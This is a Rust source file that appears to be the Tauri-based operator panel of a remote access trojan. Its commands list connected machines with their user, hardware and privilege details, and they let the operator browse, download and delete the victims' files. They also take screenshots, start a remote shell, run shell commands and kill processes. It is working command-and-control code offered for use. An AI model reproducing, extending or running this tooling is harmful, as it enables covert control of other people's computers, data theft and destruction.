use serde::Serialize;
use std::sync::{Arc, Mutex};
use tauri::State;

use crate::server::Server;

use common::commands::{Command, File, Process};

pub struct SharedServer(pub Arc<Mutex<Server>>);
pub struct SharedTauriState(pub Arc<Mutex<TauriState>>);

#[derive(Debug, Clone, Serialize)]
pub struct FrontClient {
    pub id: usize,
    pub username: String,
    pub hostname: String,
    pub os: String,
    pub ram: String,
    pub cpu: String,
    pub gpus: Vec<String>,
    pub storage: Vec<String>,
    pub displays: i32,
    pub ip: String,
    pub disconnected: bool,
    pub is_elevated: bool,
}

#[derive(Debug, Clone, Serialize)]
pub struct TauriState {
    pub port: String,
    pub running: bool
}

impl Default for TauriState {
    fn default() -> Self {
        TauriState {
            port: "1337".to_string(),
            running: false
        }
    }
}

#[tauri::command]
pub fn start_server(
    port: &str,
    server_state: State<'_, SharedServer>,
    tauri_state: State<'_, SharedTauriState>,
) -> String {
    let mut server = server_state.0.lock().unwrap();
    let running = server.listen_port(port.to_string());

    let mut tauri_state = tauri_state.0.lock().unwrap();

    if !running {
        tauri_state.running = false;
        return "false".to_string();
    };

    tauri_state.port = port.to_string();
    tauri_state.running = true;

    "true".to_string()
}

#[tauri::command]
pub fn fetch_state(
    tauri_state: State<'_, SharedTauriState>,
) -> TauriState {
    let tauri_state = tauri_state.0.lock().unwrap();
    tauri_state.clone()
}

#[tauri::command]
pub fn fetch_clients(
    server_state: State<'_, SharedServer>,
    tauri_state: State<'_, SharedTauriState>,
) -> Vec<FrontClient> {
    let server = server_state.0.lock().unwrap();

    let tauri_state = tauri_state.0.lock().unwrap();
    
    if !tauri_state.running {
        return vec![];
    }

    let mut clients: Vec<FrontClient> = vec![];

    for (i, client) in (*server.clients.lock().unwrap()).iter_mut().enumerate() {
        if !client.is_handled {
            client.is_handled = true;
            client.handle_client();
        }

        if client.is_disconnect() {
            continue;
        }   

        let front_client = FrontClient {
            id: i,
            username: client.get_username(),
            hostname: client.get_hostname(),
            os: client.get_os(),
            ram: client.get_ram(),
            cpu: client.get_cpu(),
            gpus: client.get_gpus(),
            storage: client.get_storage(),
            displays: client.get_displays(),
            ip: client.get_ip(),
            disconnected: client.is_disconnect(),
            is_elevated: client.is_elevated(),
        };

        clients.push(front_client);
    }
    clients.clone()
}

#[tauri::command]
pub fn fetch_client (id: &str, server_state: State<'_, SharedServer>) -> FrontClient {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let clients = server.clients.lock().unwrap();
    let client = clients.get(client_id).unwrap();

    FrontClient {
        id: client_id,
        username: client.get_username(),
        hostname: client.get_hostname(),
        os: client.get_os(),
        ram: client.get_ram(),
        cpu: client.get_cpu(),
        gpus: client.get_gpus(),
        storage: client.get_storage(),
        displays: client.get_displays(),
        ip: client.get_ip(),
        disconnected: client.is_disconnect(),
        is_elevated: client.is_elevated(),
    }
}


#[tauri::command]
pub fn read_files(id: &str, run: &str, path: &str, server_state: State<'_, SharedServer>) -> (String, Vec<File>) {
    let mut server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    server.reset_files();
    server.reset_folder_path();

    let mut clients = server.clients.lock().unwrap();
    let client = clients.get_mut(client_id).unwrap();

    match run {
        "previous_dir" => {
            client.write_buffer(Command::PreviousDir);
        },
        "available_disks" => {
            client.write_buffer(Command::AvailableDisks);
        },
        "view_dir" => {
            client.write_buffer(Command::ViewDir(path.to_string()));
        },
        _ => {
            return ("".to_string(), vec![]);
        }
    }

    std::thread::sleep(std::time::Duration::from_millis(200));

    (server.get_folder_path(), server.get_files())
}

#[tauri::command]
pub fn manage_file(id: &str, run: &str, file: &str, server_state: State<'_, SharedServer>) -> String {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let mut clients = server.clients.lock().unwrap();
    let client = clients.get_mut(client_id).unwrap();

    match run {
        "download_file" => {
            client.write_buffer(Command::DownloadFile(file.to_string()));
        },
        "remove_file" => {
            client.write_buffer(Command::RemoveFile(file.to_string()));
        },
        "remove_dir" => {
            client.write_buffer(Command::RemoveDir(file.to_string()));
        },
        _ => {
            return "false".to_string();
        }
    }
    
    "true".to_string()
}

#[tauri::command]
pub fn take_screenshot(id: &str, display: i32, server_state: State<'_, SharedServer>) {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let mut clients = server.clients.lock().unwrap();
    let client = clients.get_mut(client_id).unwrap();

    client.write_buffer(Command::ScreenshotDisplay(display.to_string()));
}

#[tauri::command]
pub fn handle_system_command(id: &str, run: &str, server_state: State<'_, SharedServer>) -> String {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let mut clients = server.clients.lock().unwrap();
    let client = clients.get_mut(client_id).unwrap();

    client.write_buffer(Command::ManageSystem(run.to_string()));
    
    "true".to_string()
}

#[tauri::command]
pub fn manage_shell(id: &str, run: &str, server_state: State<'_, SharedServer>) -> String {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let mut clients = server.clients.lock().unwrap();
    let client = clients.get_mut(client_id).unwrap();
    
    if run == "start" {
        if client.shell_started {
            return "true".to_string();
        }
        client.shell_started = true;
        client.write_buffer(Command::StartShell);
        return "true".to_string();
    }

    if run == "stop" {
        if !client.shell_started {
            return "false".to_string();
        }
        client.shell_started = false;
        client.write_buffer(Command::ExitShell);
        return "false".to_string();
    }

    if run =="status"{
        if client.shell_started {return "true".to_string();}
        return "false".to_string();
    }
    
    "false".to_string()

}

#[tauri::command]
pub fn execute_shell_command(id: &str, run: &str, server_state: State<'_, SharedServer>) {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let server_clone = server.clone();

    let mut clients = server_clone.clients.lock().unwrap();
    let client = clients.get_mut(client_id).unwrap();

    if client.shell_started {
        let shell_cmd = Command::ShellCommand(run.to_string());

        client.write_buffer(shell_cmd);
    }
}

#[tauri::command]
pub fn process_list(id: &str, server_state: State<'_, SharedServer>) {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let mut clients = server.clients.lock().unwrap();
    let client = clients.get_mut(client_id).unwrap();

    client.write_buffer(Command::GetProcessList);
}

#[tauri::command]
pub fn kill_process(id: &str, pid: usize, name: &str, server_state: State<'_, SharedServer>) -> String {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let mut clients = server.clients.lock().unwrap();
    let client = clients.get_mut(client_id).unwrap();

    let process = Process {
        pid,
        name: name.to_string(),
    };

    client.write_buffer(Command::KillProcess(process));

    "true".to_string()
}